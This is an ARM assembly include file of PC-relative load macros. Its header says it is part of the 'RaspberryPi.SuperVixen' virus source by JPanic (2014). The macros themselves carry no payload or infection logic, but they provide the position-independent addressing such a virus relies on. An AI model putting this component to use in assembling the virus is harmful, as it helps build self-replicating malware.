/* supervixen.inc for RaspberryPi.SuperVixen virus by JPanic, Australia, 2014. */
/* see supervixen.s for more details. */

.macro l32  arg_r,arg_i	
	.text
	ldr		\arg_r,[pc,#l32const\@ - (l32addr\@ + 4)]	
l32addr\@:
	.text 1
l32const\@:
	.word \arg_i
	.text
.endm

.macro l32c  arg_r,arg_i	
	.text
	ldr		\arg_r,[pc,#\arg_i - (l32addrC\@ + 4)]	
l32addrC\@:
.endm


.macro loffs  arg_r,arg_o
	add		\arg_r,pc,#\arg_o - (rel\@ + 4)
rel\@:
.endm

.macro loffsl  arg_r,arg_o
	ldr		\arg_r,[pc,#l32Lconst\@ - (relL\@)]	
	add		\arg_r,pc
relL\@:
	.text 1
l32Lconst\@:
	.word \arg_o - (relL\@ + 4)
	.text

.endm
